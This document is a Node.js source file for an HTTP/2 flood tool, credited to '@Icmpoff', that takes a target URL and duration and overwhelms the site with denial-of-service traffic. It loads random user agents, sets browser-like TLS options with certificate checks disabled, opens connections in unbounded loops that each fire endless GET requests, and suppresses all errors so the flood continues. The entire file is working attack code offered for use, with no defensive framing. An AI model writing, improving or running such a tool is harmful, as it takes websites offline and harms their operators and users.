const { exec } = require('child_process');
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const fs = require('fs');
const url = require('url');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const http2 = require('http2');

let payload = {};

try {
var objetive = process.argv[2];
var parsed = url.parse(objetive);
} catch(error){
    console.log('Fail to load target date.');
    process.exit();
}
const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
 ];

 let SignalsList = sigalgs.join(':');

 try {
var UAs = fs.readFileSync('useragents.txt', 'utf-8').replace(/\r/g, '').split('\n');
 } catch(error){
     console.log('Fail to load useragents.txt')
 }
class TlsBuilder {
    constructor (){
        this.curve = "GREASE:X25519:x25519";
        this.sigalgs = SignalsList;
        this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_NO_TICKET|crypto.constants.SSL_OP_NO_SSLv2|crypto.constants.SSL_OP_NO_SSLv3|crypto.constants.SSL_OP_NO_COMPRESSION|crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION|crypto.constants.SSL_OP_TLSEXT_PADDING|crypto.constants.SSL_OP_ALL|crypto.constants.SSLcom;
    }

    Alert(){
        console.log('HTTP/2 Flood by @Icmpoff');
    }

    http2TUNNEL(socket){
        socket.setKeepAlive(true, 1000);
        socket.setTimeout(10000);
        payload[":method"] = "GET";
        payload["Referer"] = objetive;
        payload["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
        payload["Cache-Control"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
        payload["Pragma"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
        payload['client-control'] = 'max-age=43200, s-max-age=43200';
        payload['Upgrade-Insecure-Requests'] = 1;
        payload['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
        payload['Accept-Encoding'] = 'gzip, deflate, br';
        payload['Accept-Language'] = 'utf-8, iso-8859-1;q=0.5, *;q=0.1'
        payload[":path"] = parsed.path;

        const tunnel = http2.connect(parsed.href, {
            createConnection: () => tls.connect({
                host: parsed.host,
                servername: parsed.host,
                secure: true,
                honorCipherOrder: true,
                requestCert: true,
                secureOptions: this.Opt,
                sigalgs: this.sigalgs,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2'],
            }, () => {          
        for (let i = 0; i < 12; i++) {
            setInterval(async () => {
                await tunnel.request(payload).close()
            });
        }
            })
     });
    }
}

BuildTLS = new TlsBuilder();
BuildTLS.Alert();
const keepAliveAgent = new http.Agent({ keepAlive: true });

function Runner(){
    const req = http.get({ 
        host: parsed.host,
        port: 443,
        path: parsed.path
        }, (res) => {
            BuildTLS.http2TUNNEL(res.socket);
        });

        req.on('error', () => {
          req.abort();
        });
}

setInterval(Runner)

setTimeout(function(){
    console.log('This attack is end')
    process.exit();
}, process.argv[3] * 1000);

process.on('uncaughtException', function(er) {
});
process.on('unhandledRejection', function(er) {
});